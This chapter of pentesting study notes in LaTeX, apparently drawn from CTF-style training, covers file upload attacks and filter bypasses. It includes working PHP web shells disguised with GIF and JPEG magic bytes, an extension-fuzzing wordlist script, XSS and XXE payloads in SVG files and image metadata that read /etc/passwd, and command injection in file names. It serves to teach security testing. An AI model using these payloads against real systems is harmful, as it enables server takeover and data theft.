\chapter{File upload attacks}

\section{Introduction}

²Uploading user files has become a key feature for most modern web applications
to allow the extensibility of web applications with user information. However,
as web application developers enable this feature, they also take the risk of
allowing end-users to store their potentially malicious data on the web
application's back-end server. If the user input and uploaded files are not
correctly filtered and validated, attackers may be able to exploit the file
upload feature to perform malicious activities, like executing arbitrary
commands on the back-end server to take control over it. 

File upload vulnerabilities are amongst the most common vulnerabilities found
in web and mobile applications.

These vulnerabilities are scored as High or Critical vulnerabilities

\subsection{Types of File Upload Attacks}
unauthenticated arbitrary file upload is The worst possible kind of file upload
vulnerability. 

Many web developers employ various types of tests to validate the extension or
content of the uploaded file. However, if these filters are not secure, they
can be bypassed to reach arbitrary file uploads to perform our attacks.


In some cases, we may not have arbitrary file uploads and may only be able to
upload a specific file type. Even in these cases, there are various attacks we
may be able to perform to exploit the file upload functionality if certain
security protections were missing from the web application.

Examples of these attacks include:
\begin{itemize}
    \item  Introducing other vulnerabilities like XSS or XXE.
    \item  Causing a Denial of Service (DoS) on the back-end server.
    \item  Overwriting critical system files and configurations.
    \item  And many others.
\end{itemize}

Finally, a file upload vulnerability is not only caused by writing insecure
functions but is also often caused by the use of outdated libraries that may be
vulnerable to these attacks. 

\section{Basic exploitation}
\subsection{Absent validation}
The most basic type of file upload vulnerability occurs when the web
application does not have any form of validation filters on the uploaded files,
allowing the upload of any file type by default.

\subsubsection{Framework identification}
first step would be to identify what language runs the web application. 

in certain web frameworks and web languages, {\bf Web Routes} are used to map URLs
 to web pages, in which case the web page extension may not be shown.
 Furthermore, file upload exploitation would also be different, as the uploaded
 files may not be directly routable or accessible.

 There exists several methode:
\begin{itemize}
     \item fuzzing for the extension of page (like index)
     \item using \href{https://www.wappalyzer.com/}{wappalyzer} 
\end{itemize}

To validate vulnerability a simple script like ``Hello world'' can be uploaded.


\section{Bypassing filters}
\subsection{Client-Side validation}
Many web applications only rely on front-end JavaScript code to validate the
selected file format before it is uploaded and would not upload it if the file
is not in the required format (e.g., not an image).

However, as the file format validation is happening on the client-side, it  can
be easily bypassed by directly interacting with the server, skipping the
front-end validations altogether or by  modifying the front-end code through
the  browser's dev tools to disable any validation in place.

\subsubsection{Request Modification}
Capture the upload request with Burp or Zap
\subsubsection{Disableing validation}
Use the  browser's Page Inspector, fnd the validation function and read the
code using the browser's Console (size the name of the function click on run
and then on the ouput click on 'jump to definition' icon).

it is possible to remove either the call or edit its parameters.

\subsection{Blacklist validation}
The backend validation maycheck the {\bf file type} or the {\bf file content} 
for type matching. The weakest form of validation amongst these is {\bf testing
the file extension against a blacklist of extension} to determine whether the
upload request should be blocked. 

This validation method has a major flaw. It is not comprehensive, as many other
extensions are not included in this list, which may still be used to execute
PHP code on the back-end server if uploaded. {\bf PayloadsAllTheThings}
provides lists of extensions for
\href{https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst}{PHP}
    and
    \href{https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP}{.NET} web applications


Using {\bf burp Intruder}(untick \verb+URL-encode these\ldots+ in payload) (or
Zap equivalent) it is possible to replay the upload request by fuzzing the
extention.


\subsection{whitelist validation}
he other type of file extension validation is by utilizing a whitelist of
allowed file extensions. A whitelist is generally more secure than a
blacklist.

We can still trick some validation function. For example 
\verb+preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)+  The issue here lies
within the regex, as it only checks whether the file name contains the
extension and not if it actually ends with it.

Tricks to use:
\begin{itemize}
    \item  double extention: (\verb+shell.jpg.php+)
    \item reverse double extension (\verb+shell.php.jpg+)
    \item Character Injection: inject several characters before or after the
        final extension to cause the web application to misinterpret the
        filename and execute the uploaded file as a PHP script. for example 
        \verb+%20 %0a %00+ which lead for example in \verb+(shell.php%00.jpg+.
\end{itemize}

\begin{verbatim}
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
\end{verbatim}



\subsection{Type filters}

many modern web servers and web applications also test the content of the
uploaded file to ensure it matches the specified type. While extension filters
may accept several extensions, content filters usually specify a single
category (e.g., images, videos, documents), which is why they do not typically
use blacklists or whitelists. This is because web servers provide functions to
check for the file content type, and it usually falls under a specific
category.

There are two common methods for validating the file content:
\verb+Content-Type Header+ or \verb+File Content+. Let's see how we can
identify each filter and how to bypass both of them.

\subsubsection{Content-type}

Using {\bf burp intruder} it is possible to fuzz the \verb+content-type+ with a
list such as
\href{https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt}{SecLists'
Content-Type Wordlist}.

{\bf Note}: A file upload HTTP request has two Content-Type headers, one for the
attached file (at the bottom), and one for the full request (at the top). We
usually need to modify the file's Content-Type header, but in some cases the
request will only contain the main Content-Type header (e.g. if the uploaded
content was sent as POST data), in which case we will need to modify the main
Content-Type header.

\subsubsection{MIME-type}
The second and more common type of file content validation is testing the
uploaded file's {\bf Multipurpose Internet Mail Extensions} (MIME) which is an
internet standard that determines the type of a file through its general format
and bytes structure.

This is usually done by inspecting the first few bytes of the file's content,
which contain the
\href{https://en.wikipedia.org/wiki/List_of_file_signatures}{File Signature} or
\href{https://opensource.apple.com/source/file/file-23/file/magic/magic.mime}{Magic
Bytes}. For example, if a file starts with (\verb+GIF87a+ or \verb+GIF89a+),
this indicates that it is a \verb+GIF+ image, while a file starting with
plaintext is usually considered a \verb+Text+ file. 

Changing the first bytes of any file to the GIF magic bytes, its MIME type
would be changed to a GIF image, regardless of its remaining content or
extension.

Tip: Many other image types have non-printable bytes for their file signatures,
while a GIF image starts with ASCII printable bytes (as shown above), so it is
the easiest to imitate. Furthermore, as the string GIF8 is common between both
GIF signatures, it is usually enough to imitate a GIF image.

\begin{verbatim}
GIF89a; <?php system($_GET['cmd']); ?>
or 
GIF8; <?php system($_GET['cmd']); ?>
\end{verbatim}

to bypass \verb+image/jpeg+
\begin{verbatim}
ÿØÿî<?php  system('cat /flag*', $ret); echo "$ret "; ?>
\end{verbatim}


\section{Opther attacks}
\subsection{Limited file uploads}
Certain file types, like SVG, HTML, XML, and even some image and document
files, may allow us to introduce new vulnerabilities to the web application by
uploading malicious versions of these files. This is why fuzzing allowed file
extensions is an important exercise for any file upload attack. It enables us
to explore what attacks may be achievable on the web server. So, let's explore
some of these attacks.

\subsubsection{XSS}
Many file types may allow us to introduce a Stored XSS vulnerability to the web
application by uploading maliciously crafted versions of them.

{\bf Image metadata}: XSS payload can be injected in text fields that are
displayed by the application surch as \verb+Comment+ or,\verb+Artist+:
\begin{verbatim}
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' PIC.jpg
exiftool PIC.jpg
\end{verbatim}

Furthermore, if we change the image's MIME-Type to i\verb+text/html+, some web
applications may show it as an HTML document instead of an image, in which case
the XSS payload would be triggered even if the metadata wasn't directly
displayed.

{\bf Scalable Vector Graphics (SVG)} images are XML-based, and they describe 2D
vector graphics, which the browser renders into an image.
\begin{verbatim}
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert("window.origin");</script>
</svg>
\end{verbatim}

\subsubsection{XEE}

{\bf SVG} can also include malicious XML data to leak the source code of the
web application, and other internal documents within the server. the result may
be displayed in the {\bf page source}.

\begin{verbatim}
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
\end{verbatim}

displaying the source code would be also of great interest
\begin{verbatim}
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM 
    "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
\end{verbatim}

Using XML data is not unique to SVG images, as it is also utilized by many
types of documents, like {\bf PDF}, {\bf Word Documents}, {\bf PowerPoint
Documents}, among many others. All of these documents include XML data within
them to specify their format and structure. 


Another similar attack that is also achievable through these file types is an
{\bf SSRF attack}. We may utilize the XXE vulnerability to enumerate the
internally available services or even call private APIs to perform private
actions. 

\subsubsection{DoS}

DoS can be achived by different means:
\begin{itemize}
        \item XXE payloads
        \item i{\bf Decompression Bomb} with file types that use data compression,
            like ZIP archivesa
        \item {\bf Pixel Flood} attack with some image files that utilize image
            compression, like JPG or PNG
\end{itemize}

In addition to these attacks, we may try a few other methods to cause a DoS on
the back-end server. One way is uploading an overly large file, as some upload
forms may not limit the upload file size or check for it before uploading it,
which may fill up the server's hard drive and cause it to crash or slow down
considerably.

If the upload function is vulnerable to directory traversal, it is possible to
upload files to a different directory (e.g. \verb+../../../etc/passwd+), which
may also cause the server to crash.


\subsection{Injection in file name}

A common file upload attack uses a malicious string for the uploaded file name,
which may get executed or processed if the uploaded file name is reflected on
the page.
\begin{verbatim}
file$(whoami).jpg
file`whoami`.jpg
file.jpg||whoami

\end{verbatim}


\subsection{Upload directory discolsure}

In some file upload forms, like a feedback form or a submission form, the link
of the uploaded file may not be accessible  and the the uploads directory may
also be unknown. In such cases, Fuzzing may be used to look for the uploads
directory or even use other vulnerabilities ({\bf LFI/XXE}) to find where the
uploaded files are by reading the web applications source code. Furthermore,
with Web attack based on {\bf Insecure Direct Object References (IODR)} offers
several methods of finding where files may be stored and identifying the file
naming scheme.

Another method we can use to disclose the uploads directory is through forcing
error messages, as they often reveal helpful information for further
exploitation. One attack useid to cause such errors is uploading a file with a
name that already exists or sending two identical requests simultaneously. This
may lead the web server to show an error that it could not write the file,
which may disclose the uploads directory. It is also possible to  try uploading
a file with an overly long name (e.g., 5,000 characters). If the web
application does not handle this correctly, it may also error out and disclose
the upload directory.

Similarly, there exists various other techniques to cause the server to error
out and disclose the uploads directory, along with additional helpful
information.


\subsection{Windows specific}
One attack is using reserved characters, such as (\verb+|, <, >, *, or ?+),
which are usually reserved for special uses like wildcards. If the web
application does not properly sanitize these names or wrap them within quotes,
they may refer to another file (which may not exist) and cause an error that
discloses the upload directory. Similarly,  Windows reserved names might be
used for the uploaded file name, like (CON, COM1, LPT1, or NUL), which may also
cause an error as the web application will not be allowed to write a file with
this name.

Finally, the \href{https://en.wikipedia.org/wiki/8.3_filename}{Windows 8.3
Filename Convention}  may be used to overwrite existing files or refer to files
that do not exist. Older versions of Windows were limited to a short length for
file names, so they used a Tilde character (~) to complete the file name, which
we can use to our advantage.

For example, to refer to a file called (\verb+hackthebox.txt+)
(\verb+HAC~1.TXT+) or (\verb+HAC~2.TXT+) can be used , where the digit
represents the order of the matching files that start with (HAC). As Windows
still supports this convention,  a file called (e.g.
\verb+WEB~.CONF+) can be used to overwrite the \verb+web.conf+ file. Similarly,
trying to  write a file that replaces sensitive system files. This attack can
lead to several outcomes, like causing information disclosure through errors,
causing a DoS on the back-end server, or even accessing private files.

\subsection{Advanced file upload attacks}

there are more advanced attacks that can be used with file upload
functionalities. Any automatic processing that occurs to an uploaded file, like
encoding a video, compressing a file, or renaming a file, may be exploited if
not securely coded.

Some commonly used libraries may have public exploits for such vulnerabilities,
like the AVI upload vulnerability leading to XXE in \verb+ffmpeg+. However,
when dealing with custom code and custom libraries, detecting such
vulnerabilities requires more advanced knowledge and techniques, which may lead
to discovering an advanced file upload vulnerability in some web applications.



\section{links}

\href{https://n3t-hunt3r.gitbook.io/pentest-book/web-application-pentesting/file-upload}{File
Upload General Methodology}


